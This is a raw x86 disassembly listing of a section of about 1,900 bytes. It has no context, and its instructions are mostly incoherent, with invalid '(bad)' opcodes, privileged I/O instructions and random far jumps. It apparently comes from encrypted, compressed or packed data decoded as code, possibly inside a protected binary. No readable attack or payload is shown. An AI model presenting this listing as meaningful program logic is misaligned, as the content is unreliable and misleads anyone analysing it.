  416dfa:	lods   eax,DWORD PTR ds:[esi]
  416dfb:	or     dl,BYTE PTR [eax-0xf68d7f5]
  416e01:	jo     0x416d83
  416e03:	mov    eax,ds:0xcfd3ec36
  416e08:	sub    BYTE PTR [ecx],dl
  416e0a:	cli    
  416e0b:	jg     0x416d97
  416e0d:	jnp    0x416d97
  416e0f:	rcl    BYTE PTR [eax+0x7f],1
  416e12:	int3   
  416e13:	push   esp
  416e14:	neg    BYTE PTR [edi+ebx*2]
  416e17:	rcr    BYTE PTR [ecx],0xae
  416e1a:	mov    esi,0x2f6c5c1f
  416e1f:	push   cs
  416e20:	sbb    ebp,DWORD PTR [edx]
  416e22:	clc    
  416e23:	retf   
  416e24:	jae    0x416dbb
  416e26:	dec    DWORD PTR [edx]
  416e28:	mov    ds:0x81742a43,eax
  416e2d:	(bad)  
  416e2e:	mov    edx,0xb8cc26f7
  416e33:	push   ss
  416e34:	nop    DWORD PTR [ebx-0x5b]
  416e38:	mov    ch,0xff
  416e3a:	lea    esp,[ecx+0x37d14264]
  416e40:	sbb    bl,BYTE PTR [edi]
  416e42:	nop
  416e43:	and    ecx,DWORD PTR [edi+0x3a]
  416e46:	jle    0x416e66
  416e48:	mov    eax,0xc3eeeaff
  416e4d:	jnp    0x416e96
  416e4f:	cmc    
  416e50:	je     0x416ea9
  416e52:	mov    edx,0x45aa060c
  416e57:	shl    al,cl
  416e59:	pushf  
  416e5a:	push   ss
  416e5b:	pusha  
  416e5c:	lods   al,BYTE PTR ds:[esi]
  416e5d:	cli    
  416e5e:	enter  0x612f,0x4d
  416e62:	cmp    eax,0x489c4753
  416e67:	in     eax,0x65
  416e69:	push   edi
  416e6a:	pop    ebp
  416e6b:	lds    esp,FWORD PTR [eax+0x1906f021]
  416e71:	scas   eax,DWORD PTR es:[edi]
  416e72:	pop    esp
  416e73:	daa    
  416e74:	aas    
  416e75:	(bad)  
  416e76:	mov    bl,0xae
  416e78:	or     DWORD PTR [eax],esi
  416e7a:	and    al,0x5d
  416e7c:	xchg   BYTE PTR [ecx],dl
  416e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e7f:	js     0x416e30
  416e81:	out    dx,eax
  416e82:	(bad)  
  416e83:	call   0x4a985541
  416e88:	push   edi
  416e89:	mov    al,0x14
  416e8b:	test   al,0x6f
  416e8d:	outs   dx,DWORD PTR ds:[esi]
  416e8e:	ja     0x416ed8
  416e90:	outs   dx,BYTE PTR ds:[esi]
  416e91:	ret    
  416e92:	jnp    0x416e21
  416e94:	sahf   
  416e95:	mov    eax,0xeca12157
  416e9a:	and    edx,edx
  416e9c:	sar    DWORD PTR [eax],cl
  416e9e:	sti    
  416e9f:	imul   DWORD PTR [ebx+0x53]
  416ea2:	push   esi
  416ea3:	adc    BYTE PTR [ebp+0x1ddde40b],ch
  416ea9:	clc    
  416eaa:	add    al,0x7f
  416eac:	sti    
  416ead:	(bad)  
  416eaf:	sub    ebx,DWORD PTR [edx]
  416eb1:	sbb    eax,0x5f8ee686
  416eb6:	push   0xffffffcd
  416eb8:	ja     0x416ed1
  416eba:	enter  0x605a,0x7a
  416ebe:	cli    
  416ebf:	loop   0x416e8d
  416ec1:	push   ss
  416ec2:	xchg   esi,eax
  416ec3:	xrelease mov BYTE PTR [esi],dl
  416ec6:	push   ds
  416ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ec8:	stos   DWORD PTR es:[edi],eax
  416ec9:	push   ss
  416eca:	stc    
  416ecb:	or     DWORD PTR [edx+0x681794b1],ecx
  416ed1:	xchg   edi,eax
  416ed2:	adc    dh,bh
  416ed4:	mov    esp,0x855d751c
  416ed9:	xor    DWORD PTR [edx+ebx*4-0x2],esp
  416edd:	xchg   DWORD PTR [ecx+0x6231103f],edx
  416ee3:	dec    esp
  416ee4:	mov    ch,0x24
  416ee6:	loope  0x416f10
  416ee8:	pop    esi
  416ee9:	mov    ebx,edi
  416eeb:	cmp    DWORD PTR es:[ebx+0x7b],ecx
  416eef:	add    BYTE PTR [esp+eax*2],bl
  416ef2:	mov    bh,0x76
  416ef4:	add    al,0x99
  416ef6:	sbb    ah,BYTE PTR [esi+0x1]
  416ef9:	add    BYTE PTR [ecx+0x5494431],bl
  416eff:	or     edx,DWORD PTR [edx]
  416f01:	shl    BYTE PTR [esi-0x75],1
  416f04:	(bad)  
  416f05:	dec    edx
  416f06:	aad    0xda
  416f08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f09:	push   ebp
  416f0a:	cmp    eax,0x4ce81c63
  416f0f:	mov    edi,0x30e4c9cc
  416f14:	fwait
  416f15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f16:	and    al,0xa4
  416f18:	fild   DWORD PTR [ebp-0x5d58e668]
  416f1e:	mov    cl,0x61
  416f20:	or     eax,0x489d073d
  416f25:	sub    esi,edx
  416f27:	aas    
  416f28:	int3   
  416f29:	pop    ebx
  416f2a:	sahf   
  416f2b:	mov    bl,0x5f
  416f2d:	loopne 0x416ee8
  416f2f:	scas   al,BYTE PTR es:[edi]
  416f30:	and    ecx,DWORD PTR [edi+0x38d546a1]
  416f36:	stc    
  416f37:	sub    esp,ecx
  416f39:	push   ss
  416f3a:	mov    esp,0x6f326fdf
  416f3f:	(bad)  
  416f41:	sbb    ah,BYTE PTR ds:0xb1fa2c3
  416f47:	and    al,0x45
  416f49:	dec    esi
  416f4a:	xchg   DWORD PTR [eax-0x53],esp
  416f4d:	lock jg 0x416f1d
  416f50:	mov    eax,ds:0xd869c79c
  416f55:	sub    al,0x60
  416f58:	fbstp  TBYTE PTR [esi+0x24415990]
  416f5e:	push   ecx
  416f5f:	mov    esi,0xe12f8ab4
  416f64:	fisttp WORD PTR [ebx+0x28a9d3ca]
  416f6a:	push   edx
  416f6b:	pop    esi
  416f6c:	adc    eax,0x776bd68a
  416f72:	cmp    DWORD PTR [edx+0x18638979],edx
  416f78:	sub    cl,BYTE PTR [ecx]
  416f7a:	loopne 0x416f31
  416f7c:	leave  
  416f7d:	std    
  416f7e:	jns    0x416f6b
  416f80:	test   eax,0x80cacd60
  416f85:	ss push ebp
  416f87:	(bad)  
  416f88:	test   eax,0x600f42ff
  416f8d:	es mov ecx,0xbcd4627
  416f93:	ret    
  416f94:	mov    dh,0x8a
  416f96:	sbb    BYTE PTR [edx],bh
  416f98:	lock fist DWORD PTR [edx]
  416f9b:	leave  
  416f9c:	not    bh
  416f9e:	pop    edx
  416f9f:	gs jne 0x416ff9
  416fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fa3:	jbe    0x416f34
  416fa5:	fcomip st,st(3)
  416fa7:	fisubr WORD PTR [ebx]
  416fa9:	(bad)  
  416faa:	clc    
  416fab:	inc    edi
  416fac:	popf   
  416fad:	xchg   edi,eax
  416fae:	aad    0xb
  416fb0:	xchg   ebp,eax
  416fb1:	xchg   ebp,eax
  416fb2:	mov    cl,ch
  416fb4:	mov    ebx,0x5db18f81
  416fb9:	mov    bl,0xc8
  416fbb:	mov    ecx,0x625fe719
  416fc0:	ficom  WORD PTR [ebx-0x1]
  416fc3:	inc    ebp
  416fc4:	icebp  
  416fc5:	sub    edx,0x5ed83ae6
  416fcb:	out    dx,eax
  416fcc:	iret   
  416fcd:	jp     0x41703d
  416fcf:	mov    ch,0x13
  416fd1:	rcr    DWORD PTR [ecx+0x35],1
  416fd4:	sbb    BYTE PTR [eax],cl
  416fd6:	jae    0x416f7f
  416fd8:	mov    al,ds:0x12e1be26
  416fdd:	mov    ds:0xe8c8497,eax
  416fe2:	data16 mov BYTE PTR [edx],bh
  416fe5:	in     al,dx
  416fe6:	ins    DWORD PTR es:[edi],dx
  416fe7:	inc    esi
  416fe8:	hlt    
  416fe9:	xchg   esi,eax
  416fea:	fdiv   st,st(0)
  416fec:	(bad)  
  416fed:	or     al,0xc2
  416fef:	dec    edx
  416ff0:	pop    edx
  416ff1:	out    dx,al
  416ff2:	pop    ecx
  416ff3:	add    BYTE PTR [ebp+0x6f2adedd],0x5
  416ffa:	fs test eax,0xdc732f14
  417000:	not    BYTE PTR [esi-0x7b]
  417003:	outs   dx,BYTE PTR ds:[esi]
  417004:	out    dx,eax
  417005:	stc    
  417006:	pop    eax
  417007:	inc    edi
  417008:	dec    esp
  417009:	push   ds
  41700a:	leave  
  41700b:	pop    es
  41700c:	or     DWORD PTR [ebx+0xd],edi
  41700f:	ja     0x417085
  417011:	popa   
  417012:	repz sbb DWORD PTR [edi+0x2a],edi
  417016:	jo     0x41705c
  417018:	aam    0xa6
  41701a:	xchg   edi,eax
  41701b:	inc    ebp
  41701c:	data16 addr16 or al,0x7b
  417020:	outs   dx,BYTE PTR ds:[esi]
  417021:	in     eax,dx
  417022:	test   BYTE PTR [eax],dl
  417024:	call   0x648e:0x4f123880
  41702b:	fs sbb ebx,DWORD PTR ds:[esi+0xf]
  417030:	push   edi
  417031:	sysret 
  417033:	push   cs
  417034:	push   cs
  417035:	rcl    DWORD PTR [ebx],0x9d
  417038:	in     al,dx
  417039:	mov    eax,ds:0x9eb5d4d
  41703e:	shl    dh,cl
  417040:	loopne 0x417031
  417042:	xlat   BYTE PTR ds:[ebx]
  417043:	jmp    0x41704a
  417045:	and    al,0x3a
  417047:	pop    ebp
  417048:	jmp    FWORD PTR ds:0x3ac7c102
  41704e:	xor    eax,0x31caa1e
  417053:	(bad)  
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi+0x5beeacbb],edx
  41706d:	mov    eax,DWORD PTR [ebp+0x2b]
  417070:	jg     0x4170ea
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x417044
  417077:	inc    edi
  417078:	jge    0x4170aa
  41707a:	mov    WORD PTR [esi],cs
  41707c:	mov    edi,0xb133dfa3
  417081:	arpl   WORD PTR [esi-0x2],dx
  417084:	jl     0x41704d
  417086:	rol    BYTE PTR [edi+0x5a5f82b3],cl
  41708c:	(bad)  
  41708d:	aam    0x29
  41708f:	jge    0x4170c7
  417091:	jnp    0x41704e
  417093:	clc    
  417094:	addr16 inc edi
  417096:	dec    esp
  417097:	fwait
  417098:	xchg   ecx,eax
  417099:	push   cs
  41709a:	test   DWORD PTR [ebx],edi
  41709c:	mov    ah,BYTE PTR [ecx+0x5f956d06]
  4170a2:	int    0x53
  4170a4:	(bad)  
  4170a5:	popa   
  4170a6:	hlt    
  4170a7:	xchg   ebx,eax
  4170a8:	addr16 addr16 cs pop esp
  4170ac:	inc    eax
  4170ad:	add    ecx,DWORD PTR [edx-0x710ffba5]
  4170b3:	xchg   esp,eax
  4170b4:	add    DWORD PTR [ebx],ecx
  4170b6:	pop    es
  4170b7:	and    BYTE PTR [ecx+0x52],ch
  4170ba:	mov    eax,0x8aa8ebbd
  4170bf:	mov    ds:0xb22f69ed,eax
  4170c4:	add    eax,0xb497f721
  4170c9:	dec    edx
  4170ca:	retf   
  4170cb:	rol    BYTE PTR [edx+0x24],cl
  4170ce:	ss dec edx
  4170d0:	mov    al,0x62
  4170d2:	(bad)  
  4170d3:	aaa    
  4170d4:	sbb    al,0x4e
  4170d6:	push   0x7959439a
  4170db:	dec    esp
  4170dc:	rol    DWORD PTR [edx],1
  4170de:	mov    ds:0x2544aa59,al
  4170e3:	inc    ecx
  4170e4:	call   0xec7c:0x8c31e84f
  4170eb:	cmp    BYTE PTR [edx+0x1c71c885],bh
  4170f1:	adc    BYTE PTR [ecx],ah
  4170f3:	leave  
  4170f4:	push   cs
  4170f5:	jg     0x4170b9
  4170f7:	mov    ss,esp
  4170f9:	out    0x5,al
  4170fb:	jle    0x417102
  4170fd:	xlat   BYTE PTR ds:[ebx]
  4170fe:	lods   al,BYTE PTR ds:[esi]
  4170ff:	pop    ecx
  417100:	jne    0x4170f7
  417102:	mov    al,0xd1
  417104:	call   0x337682f7
  417109:	retf   0x5484
  41710c:	scas   eax,DWORD PTR es:[edi]
  41710d:	jno    0x4170f2
  41710f:	ja     0x41717f
  417111:	pop    ds
  417112:	jmp    DWORD PTR [esi-0x6791552]
  417118:	push   ds
  417119:	leave  
  41711a:	dec    ebp
  41711b:	enter  0xe6a7,0x6d
  41711f:	popf   
  417120:	jecxz  0x41714a
  417122:	daa    
  417123:	sub    BYTE PTR [ecx],bl
  417125:	lock js 0x4170f4
  417128:	sahf   
  417129:	or     eax,0x51e12769
  41712e:	out    dx,al
  41712f:	das    
  417130:	and    eax,0x92ece17e
  417135:	adc    edx,edi
  417137:	and    eax,DWORD PTR [ebx]
  417139:	in     al,dx
  41713a:	sti    
  41713b:	adc    edi,DWORD PTR [edx]
  41713d:	and    BYTE PTR [ecx],bl
  41713f:	sbb    DWORD PTR [ebp+0xd],edi
  417142:	ret    0xcb4f
  417145:	jmp    FWORD PTR [edi+0x5a]
  417148:	icebp  
  417149:	mov    ?,WORD PTR [edx]
  41714b:	(bad)  
  41714c:	std    
  41714d:	adc    cl,0xaa
  417150:	scas   eax,DWORD PTR es:[edi]
  417151:	push   ecx
  417152:	push   ebp
  417153:	xchg   ebx,eax
  417154:	hlt    
  417155:	or     DWORD PTR [ebx],eax
  417157:	ins    DWORD PTR es:[edi],dx
  417158:	xlat   BYTE PTR ds:[ebx]
  417159:	daa    
  41715a:	push   esi
  41715b:	mov    al,ds:0x69eaf79f
  417160:	(bad)
  417163:	cld    
  417164:	fsubr  QWORD PTR [esi]
  417166:	arpl   di,di
  417168:	sbb    BYTE PTR [ecx-0x56],bl
  41716b:	mov    cl,0x8b
  41716d:	stos   DWORD PTR es:[edi],eax
  41716e:	jle    0x417143
  417170:	xor    edx,DWORD PTR [edx]
  417172:	xor    al,0xc7
  417174:	jns    0x4171f4
  417176:	retf   0x21f7
  417179:	enter  0x340e,0x2f
  41717d:	pushf  
  41717e:	ja     0x4171c5
  417180:	in     eax,0x79
  417182:	xchg   edx,eax
  417183:	in     al,dx
  417184:	cmp    al,0x63
  417186:	pop    esp
  417187:	sub    edi,DWORD PTR [ebx-0x59]
  41718a:	arpl   dx,dx
  41718c:	pop    ds
  41718d:	inc    eax
  41718e:	out    0xc7,al
  417190:	(bad)  
  417191:	pop    edx
  417192:	les    edi,FWORD PTR [ebp-0x245fc0e5]
  417198:	je     0x4171c5
  41719a:	cmp    dl,BYTE PTR [edx-0x3f0f04f9]
  4171a0:	and    edx,DWORD PTR [ecx-0x31]
  4171a3:	imul   edi,DWORD PTR [edx+0x12],0xe05e9030
  4171aa:	or     esi,ecx
  4171ac:	das    
  4171ad:	outs   dx,BYTE PTR ds:[esi]
  4171ae:	push   ebp
  4171af:	xchg   ebx,eax
  4171b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171b1:	and    DWORD PTR [bp+di],eax
  4171b4:	mov    ch,0x1e
  4171b6:	adc    esp,ecx
  4171b8:	sbb    edi,ecx
  4171ba:	ss mov ecx,0x1dfece5f
  4171c0:	int    0x85
  4171c2:	into   
  4171c3:	imul   eax,DWORD PTR [ebx+0x72dc7a5c],0xffffffe9
  4171ca:	jne    0x4171e6
  4171cc:	loopne 0x417188
  4171ce:	xchg   ebx,eax
  4171cf:	xlat   BYTE PTR ds:[ebx]
  4171d0:	sub    al,0x38
  4171d2:	in     al,0x5f
  4171d4:	xor    eax,0x6f96cd9c
  4171d9:	imul   eax,DWORD PTR [edi-0x249a1b4e],0xffffffad
  4171e0:	jge    0x4171cd
  4171e2:	js     0x41719b
  4171e4:	fmul   st(7),st
  4171e6:	mov    dl,0x8b
  4171e8:	lock pop esi
  4171ea:	dec    edx
  4171eb:	and    al,0x40
  4171ed:	scas   eax,DWORD PTR es:[edi]
  4171ee:	int3   
  4171ef:	or     BYTE PTR [edi],dl
  4171f1:	xor    esp,edx
  4171f3:	ja     0x417202
  4171f5:	jns    0x417237
  4171f7:	add    al,0x3c
  4171f9:	inc    esi
  4171fa:	mov    dh,0x87
  4171fc:	stos   DWORD PTR es:[edi],eax
  4171fd:	sbb    BYTE PTR [ecx+ebx*1],dh
  417200:	mov    DWORD PTR [ebx],edi
  417202:	gs sub ecx,0x6421a61
  417209:	(bad)  
  41720a:	jp     0x417228
  41720c:	retf   0xf50d
  41720f:	rol    DWORD PTR [ebp-0x33fe4c3e],cl
  417215:	xchg   edi,eax
  417216:	fstp   st(1)
  417218:	ficomp DWORD PTR [edx+0x47599134]
  41721e:	jnp    0x417296
  417220:	add    ah,dl
  417222:	lock outs dx,DWORD PTR ds:[esi]
  417224:	lock (bad) 
  417226:	in     eax,0xc1
  417228:	fs and eax,0xdb9bd0a0
  41722e:	int    0x96
  417230:	pop    ss
  417231:	fsub   DWORD PTR [ebx-0x80]
  417234:	sti    
  417235:	adc    DWORD PTR [esi+0x302c3298],ebp
  41723b:	sar    DWORD PTR [esp+eax*2-0x4a],cl
  41723f:	pop    esi
  417240:	sti    
  417241:	loop   0x4172ad
  417243:	(bad)  
  417245:	sub    eax,0x1cddc745
  41724a:	stc    
  41724b:	repz les ecx,FWORD PTR [eax]
  41724e:	imul   esi,DWORD PTR [eax-0x28],0xffffff96
  417252:	sbb    BYTE PTR [edx],dh
  417254:	adc    DWORD PTR [ebp-0x3be53861],edi
  41725a:	pop    esi
  41725b:	mov    edi,0x54e748e3
  417260:	nop
  417261:	stos   BYTE PTR es:[edi],al
  417262:	xchg   ebp,eax
  417263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417264:	and    al,ah
  417266:	lea    edx,[eax]
  417268:	fiadd  DWORD PTR [ebx]
  41726a:	push   es
  41726b:	cmp    BYTE PTR [edx],bh
  41726d:	pusha  
  41726e:	ja     0x417298
  417270:	sub    eax,0xe98b1869
  417275:	loopne 0x41722a
  417277:	mov    eax,esp
  417279:	mov    ds:0xaf316d11,eax
  41727e:	xchg   DWORD PTR [ecx+eax*8-0x3f99ee0d],ebp
  417285:	loopne 0x417209
  417287:	into   
  417288:	sub    al,BYTE PTR [esp+ecx*2+0x46]
  41728c:	or     BYTE PTR [edx],al
  41728e:	lds    ecx,FWORD PTR ds:0x36bedfe
  417294:	pop    ds
  417295:	adc    BYTE PTR [edi-0x6c494d9f],dh
  41729b:	clc    
  41729c:	loope  0x417283
  41729e:	push   eax
  41729f:	push   esp
  4172a0:	mov    al,0xfc
  4172a2:	pop    ebx
  4172a3:	daa    
  4172a4:	sbb    eax,DWORD PTR [eax]
  4172a6:	inc    edx
  4172a7:	adc    eax,0xf3b95de8
  4172ad:	mov    esi,DWORD PTR [eax]
  4172af:	mov    ?,ecx
  4172b1:	pop    ebp
  4172b2:	nop
  4172b3:	jecxz  0x4172d9
  4172b5:	jno    0x417243
  4172b7:	xor    cl,bl
  4172b9:	xchg   ebp,eax
  4172ba:	std    
  4172bb:	sbb    DWORD PTR [ecx],edx
  4172bd:	lods   eax,DWORD PTR ds:[esi]
  4172be:	push   ecx
  4172bf:	add    al,0xd3
  4172c1:	add    BYTE PTR [bx+0x3c72],0x96
  4172c7:	inc    eax
  4172c8:	push   esp
  4172c9:	inc    edi
  4172ca:	inc    ecx
  4172cb:	xchg   DWORD PTR [eax],ebx
  4172cd:	dec    ebp
  4172ce:	(bad)  
  4172cf:	pop    ebp
  4172d0:	pop    edx
  4172d1:	xchg   esp,eax
  4172d2:	test   DWORD PTR [edx],0x87fc5681
  4172d8:	enter  0x15e5,0x19
  4172dc:	xchg   ebx,eax
  4172dd:	push   ebx
  4172de:	mov    edi,0x779e64e0
  4172e3:	loope  0x4172ef
  4172e5:	xchg   esp,eax
  4172e6:	push   ecx
  4172e7:	nop
  4172e8:	adc    eax,esi
  4172ea:	sti    
  4172eb:	jae    0x41728b
  4172ed:	hlt    
  4172ee:	mov    cl,0xa6
  4172f0:	mov    ebp,0xcd7c61e7
  4172f5:	scas   al,BYTE PTR es:[edi]
  4172f6:	sbb    al,0x3
  4172f8:	in     al,dx
  4172f9:	stc    
  4172fa:	retf   
  4172fb:	in     eax,dx
  4172fc:	add    eax,DWORD PTR [ebp+0x8]
  4172ff:	and    eax,0xe1ac7b2d
  417304:	or     DWORD PTR ds:0xab90b2f0,0x41
  41730b:	cmp    DWORD PTR [ecx-0x49],esi
  41730e:	xor    DWORD PTR [esi+ebx*2-0x78a01],eax
  417315:	jne    0x417313
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	rol    bh,1
  417334:	mov    edx,0x28e24852
  417339:	jg     0x4173b3
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x4172ed
  417340:	ret    0x4a92
  417343:	sub    esi,DWORD PTR [edx-0x212ad3ba]
  417349:	enter  0x6ffc,0x35
  41734d:	and    ebx,edx
  41734f:	clc    
  417350:	dec    ecx
  417351:	push   edx
  417352:	xor    bh,dl
  417354:	outs   dx,DWORD PTR ds:[esi]
  417355:	shr    DWORD PTR [esi+0x4d],0x34
  417359:	aad    0x7
  41735b:	addr16 jns 0x417342
  41735e:	xchg   esi,eax
  41735f:	jns    0x417322
  417361:	xchg   esi,eax
  417362:	cmc    
  417363:	fmul   QWORD PTR [eax-0x43d7e43d]
  417369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41736a:	mov    al,ds:0x4a36efa7
  41736f:	push   0x12
  417371:	loope  0x41730e
  417373:	mov    eax,0xf6f002aa
  417378:	test   bl,bh
  41737a:	sub    BYTE PTR ds:0x21ac4abc,ah
  417380:	xchg   BYTE PTR [ecx-0x709b4d4e],al
  417386:	lds    eax,FWORD PTR [edi+edx*4-0x1cd0c447]
  41738d:	sahf   
  41738e:	cwde   
  41738f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417390:	scas   al,BYTE PTR es:[edi]
  417391:	clc    
  417392:	sbb    esi,esi
  417394:	in     al,dx
  417395:	out    dx,eax
  417396:	push   0xb5e028ee
  41739b:	lock inc ebx
  41739d:	sub    cl,BYTE PTR [esi+0x15c9be4c]
  4173a3:	push   eax
  4173a4:	sub    al,0x16
  4173a6:	lea    esi,[esi-0x3e0e5520]
  4173ac:	jp     0x4173df
  4173ae:	cwde   
  4173af:	adc    eax,0xebdd8044
  4173b4:	mov    ?,ecx
  4173b6:	sbb    DWORD PTR [ebx],esp
  4173b8:	lock clc 
  4173ba:	ret    0x8de2
  4173bd:	pop    edx
  4173be:	scas   eax,DWORD PTR es:[edi]
  4173bf:	pop    ebx
  4173c0:	push   ds
  4173c1:	jo     0x4173b5
  4173c3:	add    al,0x7f
  4173c5:	push   cs
  4173c6:	std    
  4173c7:	(bad)  
  4173c8:	and    ecx,DWORD PTR [eax+ebx*1+0x11781311]
  4173cf:	adc    bh,BYTE PTR [edi]
  4173d1:	shl    BYTE PTR [edi+0x5f],0x16
  4173d5:	pop    ecx
  4173d6:	add    esp,DWORD PTR [esi-0x4a1b9054]
  4173dc:	mov    eax,0xeb80b53c
  4173e1:	inc    ebp
  4173e2:	mov    ecx,0xa1d8dddc
  4173e7:	mov    bh,0x4a
  4173e9:	xor    esp,DWORD PTR [ebp-0x47]
  4173ec:	pop    ecx
  4173ed:	popf   
  4173ee:	daa    
  4173ef:	rcl    BYTE PTR [ebx-0x2b],0xbf
  4173f3:	or     DWORD PTR [ebx],eax
  4173f5:	or     al,0x3d
  4173f7:	imul   eax,DWORD PTR [esi],0xffffffe6
  4173fa:	add    DWORD PTR [esi+esi*1],esi
  4173fd:	adc    al,0xcf
  4173ff:	imul   edx,DWORD PTR [edx+0x7e],0x1876960e
  417406:	xchg   BYTE PTR [edi-0x5e],dl
  417409:	dec    esi
  41740a:	inc    edx
  41740b:	push   edi
  41740c:	and    edi,edx
  41740e:	or     edx,DWORD PTR [esp+eax*2]
  417411:	clc    
  417412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417413:	dec    ebp
  417414:	repz out dx,al
  417416:	or     eax,DWORD PTR [esi]
  417418:	fstp   st(5)
  41741a:	jo     0x41739e
  41741c:	sahf   
  41741d:	imul   edx,DWORD PTR [edx],0x13
  417420:	cmp    DWORD PTR [ebx-0x6d60643f],ebx
  417426:	ret    
  417427:	imul   edx,DWORD PTR [edi+0x52805766],0x1c256979
  417431:	jge    0x417465
  417433:	addr16 mov esi,0x784faf33
  417439:	sub    BYTE PTR [ebx-0x3d],bh
  41743c:	out    dx,eax
  41743d:	fcomp  QWORD PTR [ecx-0x43]
  417440:	add    BYTE PTR [ebp+0x1cba220d],bl
  417446:	imul   esi,DWORD PTR [ebx],0xbfe513ef
  41744c:	addr16 jb 0x417475
  41744f:	fisub  DWORD PTR gs:[esi+edx*1+0x1bdd126b]
  417457:	cwde   
  417458:	jge    0x4174ca
  41745a:	inc    ecx
  41745b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41745c:	popa   
  41745d:	fldenv [ebp+0x1c]
  417460:	clc    
  417461:	std    
  417462:	pop    edx
  417463:	xchg   BYTE PTR ss:[esi-0x2df289c5],ah
  41746a:	stos   BYTE PTR es:[edi],al
  41746b:	aas    
  41746c:	aam    0x93
  41746e:	out    dx,eax
  41746f:	sub    ah,BYTE PTR [eax]
  417471:	push   ebp
  417472:	mov    edi,0xc069fe9
  417477:	pop    ebx
  417478:	push   esi
  417479:	jmp    0xd7edf649
  41747e:	bound  eax,QWORD PTR [ebx+edx*4-0x4c6cf70f]
  417485:	fiadd  DWORD PTR [edi]
  417487:	ja     0x4174ac
  417489:	mov    edi,0xbe9c26d5
  41748e:	ror    ebx,0x1d
  417491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417492:	test   BYTE PTR [ebp-0x60],0x59
  417496:	add    DWORD PTR [ebp+0xba37b46],ecx
  41749c:	(bad)  
  41749d:	loope  0x417490
  41749f:	clc    
  4174a0:	adc    esi,DWORD PTR [eax+0x7]
  4174a3:	mov    dl,BYTE PTR [edi-0xf75c8ba]
  4174a9:	jb     0x4174f4
  4174ab:	je     0x41750a
  4174ad:	popa   
  4174ae:	pop    edx
  4174af:	jne    0x41751b
  4174b1:	jo     0x41750b
  4174b3:	mov    ecx,0x6b046435
  4174b8:	jae    0x4174cf
  4174ba:	ret    
  4174bb:	xor    ebp,DWORD PTR [esi+0x49]
  4174be:	mov    ebx,ds
  4174c0:	or     al,0x25
  4174c2:	and    DWORD PTR [edi+0x1634df06],ebx
  4174c8:	aad    0xb0
  4174ca:	data16 scas al,BYTE PTR es:[edi]
  4174cc:	fist   WORD PTR [ebx-0x8]
  4174cf:	push   ebx
  4174d0:	mov    BYTE PTR [ecx-0x323321f4],bl
  4174d6:	push   esp
  4174d7:	push   cs
  4174d8:	pusha  
  4174d9:	loope  0x417545
  4174db:	(bad)  
  4174dc:	stc    
  4174dd:	lds    ecx,FWORD PTR [esi-0x487fd0c0]
  4174e3:	test   al,0xb1
  4174e5:	(bad)  
  4174e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174e7:	rol    BYTE PTR [ebx+edx*4-0xd],0x57
  4174ec:	adc    eax,0xab72d503
  4174f1:	stc    
  4174f2:	xchg   edx,eax
  4174f3:	test   al,0xf9
  4174f5:	popf   
  4174f6:	mov    al,ds:0xcb30b069
  4174fb:	push   esp
  4174fc:	iret   
  4174fd:	push   edx
  4174fe:	sub    BYTE PTR [ecx],0xca
  417501:	dec    esi
  417502:	punpckhbw mm4,QWORD PTR [ebx+0x62c59ed3]
  417509:	out    dx,al
  41750a:	xchg   BYTE PTR [ecx+0x319a63dd],cl
  417510:	cli    
  417511:	xor    eax,0x7ddc6b9d
  417516:	shufps xmm2,xmm5,0xdc
  41751a:	jnp    0x417506
  41751c:	clc    
  41751d:	jg     0x41758b
  41751f:	cmp    DWORD PTR [ebx-0x4a],eax
  417522:	data16 xchg BYTE PTR [esi],bh
  417525:	nop
  417526:	sbb    eax,0x5d77da
  41752b:	shl    BYTE PTR [edi+edi*1-0x182f3000],0xce
  417533:	shl    DWORD PTR [esi+edi*1+0x45e57ce7],cl
  41753a:	mov    bh,0x52
  41753c:	sti    
  41753d:	mov    esp,0x5d2328de
  417542:	mov    WORD PTR [edi-0x7bd7da88],?
  417548:	cmp    ecx,ebx
  41754a:	and    edi,ebx
  41754c:	or     al,0xef
  41754e:	mov    ds:0x97bd8d0d,eax
  417553:	imul   edx,ebx,0xc4cbb8e
  417559:	icebp  
  41755a:	add    DWORD PTR [edx+eax*2+0x68bf697c],esp
  417561:	out    0xf3,al
  417563:	xor    DWORD PTR [ebx-0x58b19154],edx
  417569:	pusha  
  41756a:	sbb    ebp,DWORD PTR [eax-0x4b4f9d64]
  417570:	(bad)  
  417571:	call   0x215c2de2
  417576:	ret    
  417577:	(bad)  
  417578:	(bad)  
  417579:	cmp    DWORD PTR [eax+edx*2+0x7970ab5d],edx
  417580:	mov    edi,0xb51b3119
  417585:	lahf   
  417586:	xor    DWORD PTR [esi+esi*8],0x0
  41758a:	cmp    BYTE PTR [ecx+0x7d],dh
  41758d:	stos   DWORD PTR es:[edi],eax
  41758e:	addr16 iret 
  417590:	nop
  417591:	test   DWORD PTR [ecx],0x766c1d85
  417597:	popa   
  417598:	pop    esp
  417599:	xchg   edi,eax
  41759a:	pop    edi
  41759b:	scas   al,BYTE PTR es:[edi]
  41759c:	pop    es
  41759d:	push   ss
